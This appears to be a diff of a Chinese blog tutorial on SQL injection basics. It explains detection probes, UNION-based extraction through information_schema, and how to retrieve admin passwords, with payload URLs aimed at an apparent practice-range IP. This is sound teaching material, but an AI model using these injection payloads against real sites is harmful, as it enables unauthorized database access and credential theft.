@@ -270,18 +270,16 @@
       
         <p>SQL注入的基本原理分析入门。</p>
 <span id="more"></span>
-
 <h1 id="SQL注入原理分析"><a href="#SQL注入原理分析" class="headerlink" title="SQL注入原理分析"></a>SQL注入原理分析</h1><h2 id="SQL注入的本质"><a href="#SQL注入的本质" class="headerlink" title="SQL注入的本质"></a>SQL注入的本质</h2><p>SQL：结构化查询语言（数据库的代码）</p>
 <p>注入攻击的本质：把用户输入的数据当作代码执行</p>
 <p>关键点</p>
 <pre><code>1. 用户能够控制输入
 2. 原本程序要执行的代码，拼接了用户输入的数据后进行执行
-</code></pre>
-<p>SQL注入就是针对SQL语句的注入</p>
+</code></pre><p>SQL注入就是针对SQL语句的注入</p>
 <p>SQL注入应用的场景：任何与数据库交互的传参（任何传参点）</p>
 <p>判断是不是SQL注入：</p>
 <ul>
-<li><p>在url的后面写 <code>and 1=1</code> 正确 <code>and 1=2</code> 错误 &#x3D;&gt;极有可能有SQL注入，如果and被过滤，可能要找其他符号代替</p>
+<li><p>在url的后面写 <code>and 1=1</code> 正确 <code>and 1=2</code> 错误 =&gt;极有可能有SQL注入，如果and被过滤，可能要找其他符号代替</p>
 </li>
 <li><p>运算符检测。若写<code>2-1</code>传参是1的时候，一定有SQL注入，只有数据库参与其中才会进行运算(一般不要用+，因为url会自动将+转化为空格) </p>
 </li>
@@ -291,14 +289,14 @@
 <p>我们知道了如何判断是否存在SQL注入，我想要的东西，肯定是数据库中信息。<br>数据库里面有网站的一切敏感信息，例如：管理员账号密码</p>
 <hr>
 <p>利用漏洞，看是否能拿到数据：</p>
-<p>union &#x3D;&gt; 联合查询：将两条sql语句一起输出（必须满足类型：相同字段数）</p>
-<p>order by &#x3D;&gt;排序：用来判断存在注入的点之前有几个字段（超过则报错）    id一般是正整数，使用一个浮点数让其不输出；数据库可以选择性输出，所以要找输出点</p>
-<p>database() &#x3D;&gt;显示当前数据库的库名</p>
-<p>information_schema&#x3D;&gt;系统自带库，存着tables表，里面储存了数据表和数据库的关联</p>
+<p>union =&gt; 联合查询：将两条sql语句一起输出（必须满足类型：相同字段数）</p>
+<p>order by =&gt;排序：用来判断存在注入的点之前有几个字段（超过则报错）    id一般是正整数，使用一个浮点数让其不输出；数据库可以选择性输出，所以要找输出点</p>
+<p>database() =&gt;显示当前数据库的库名</p>
+<p>information_schema=&gt;系统自带库，存着tables表，里面储存了数据表和数据库的关联</p>
 <p><code>select table_name from tables where table_schema =&#39;xxx&#39;</code></p>
 <p><code>select table_name from information_schema.tables where table_schema =&#39;xxx&#39;</code>    (在别的库中时这样使用，即库.表.字段格式)</p>
-<p>limit &#x3D;&gt;分页 </p>
-<p>​    limit n,m&#x3D;&gt; 从n+1条数据开始取m条</p>
+<p>limit =&gt;分页 </p>
+<p>​    limit n,m=&gt; 从n+1条数据开始取m条</p>
 <p>information_schema.columns 里面有字段</p>
 <p><code>select from 1,table_name from information_schema.columns where table_name=&#39;admin&#39; and table_schema=database()</code></p>
 <p><code>select *from admin where username=&#39;a&#39;</code><br><code>UNION</code><br><code>select *from news where id=1</code></p>
@@ -308,7 +306,7 @@
 <p>网页只显示给你看的部分的数据给你看</p>
 <p>把传参的数据改成浮点数，导致输出错误，然后union我们要执行的东西</p>
 <p>用<code>union select 1,2</code> 如果输出2 说明2是回显点</p>
-<p>我们要管理员的密码&#x3D;&gt;要知道在什么表，什么字段</p>
+<p>我们要管理员的密码=&gt;要知道在什么表，什么字段</p>
 <p>查库：select database();</p>
 <p>表： mysql有一张默认的自带表，叫<code>tables</code> ，里面显示的是库和表的关联，语句：<code>select table_name from information_schema.tables where table_schema=&#39;xx&#39;</code> 从information库中查表名</p>
 <p>通过<code>库.表</code>选中某个库中的某个表</p>
@@ -316,16 +314,16 @@
 <p>闭合：双引号和单引号里面都是字符串，要让我们的语句当作代码执行，则加<code>‘</code> 让前面的单引号闭合，后面用<code>-- xxx</code> 注释，使得后面的单引号失效</p>
 <h2 id="分析猫舍注入"><a href="#分析猫舍注入" class="headerlink" title="分析猫舍注入"></a>分析猫舍注入</h2><p><code>http://59.63.200.79:8003/?id=1.111 union select &#39;a&#39;,table_name from information_schema.tables where table_schema= database() limit 0,1</code>  ‘a’是为了填充字段 <code>limit 0,1</code>是取第一条数据</p>
 <p><code>http://59.63.200.79:8003/?id=1.111 union select 1,column_name from information_schema.columns where table_name = &#39;admin&#39; and table_schema=database() limit 3,1</code> 获得字段</p>
-<h2 id="显错注入靶场做法"><a href="#显错注入靶场做法" class="headerlink" title="显错注入靶场做法"></a>显错注入靶场做法</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>最古老的方法：    and 1&#x3D;1 页面正常 </p>
-<p>   and 1&#x3D;2 页面不正常</p>
+<h2 id="显错注入靶场做法"><a href="#显错注入靶场做法" class="headerlink" title="显错注入靶场做法"></a>显错注入靶场做法</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>最古老的方法：    and 1=1 页面正常 </p>
+<p>   and 1=2 页面不正常</p>
 <p>最简单的方法：    页面后面加’,看是否报错</p>
 <p>老师的方法：    </p>
 <p> 如果是数字型传参，可以尝试-1 </p>
 <p> 例如：</p>
-<p> <a target="_blank" rel="noopener" href="http://www.xxx.com/new.php?id=1">http://www.xxx.com/new.php?id=1</a>  页面显示id&#x3D;1的新闻</p>
-<p> <a target="_blank" rel="noopener" href="http://www.xxx.com/new.php?id=2-1">http://www.xxx.com/new.php?id=2-1</a> 页面显示id&#x3D;1的新闻</p>
-<p> and 1&#x3D;1 and 1&#x3D;2 被拦截的可能性太高了</p>
-<p> 可以尝试 and -1&#x3D;-1 and -1&#x3D;-2 and 1&gt;0 or 1&#x3D;1 </p>
+<p> <a target="_blank" rel="noopener" href="http://www.xxx.com/new.php?id=1">http://www.xxx.com/new.php?id=1</a>  页面显示id=1的新闻</p>
+<p> <a target="_blank" rel="noopener" href="http://www.xxx.com/new.php?id=2-1">http://www.xxx.com/new.php?id=2-1</a> 页面显示id=1的新闻</p>
+<p> and 1=1 and 1=2 被拦截的可能性太高了</p>
+<p> 可以尝试 and -1=-1 and -1=-2 and 1&gt;0 or 1=1 </p>
 <p>或者直接 or sleep(5)</p>
 <h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p><img src="https://s2.loli.net/2022/03/03/JIDeTxZtk15O2j4.png" alt="image-20220303185911160"></p>
 <p>Mysql在5.0以上版本加入了 information_schema 这个系统自带库 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等</p>
@@ -337,7 +335,7 @@
 <h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><p><code>and 1=2 union select 1,2,column_name from information_schema.columns where table_name=表名 and table_schema=database() limit 0,1</code></p>
 <h3 id="查字段内容"><a href="#查字段内容" class="headerlink" title="查字段内容"></a>查字段内容</h3><p><code>and 1=2 union select 1,字段名,字段名 from 表名 limit 0,1</code></p>
 <p><code>GROUP_CONCAT</code> 将多行数据进行整合在一行输出</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    1、判断SQL注入 （and +-*&#x2F; sleep）<br>​    2、SQL注入的流程（猜字段数、找回显点、去系统自带库查询表名字段名、取数据）<br>​    3、information_schema (tables columns)<br>​       database() 显示当前的库名<br>​       传参方式不重要，最重要的是获取的传参是否会放入数据库执行</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    1、判断SQL注入 （and +-*/ sleep）<br>​    2、SQL注入的流程（猜字段数、找回显点、去系统自带库查询表名字段名、取数据）<br>​    3、information_schema (tables columns)<br>​       database() 显示当前的库名<br>​       传参方式不重要，最重要的是获取的传参是否会放入数据库执行</p>
 
     </div>
 
@@ -574,6 +572,8 @@
 
 
 
+
+  
 
   
 
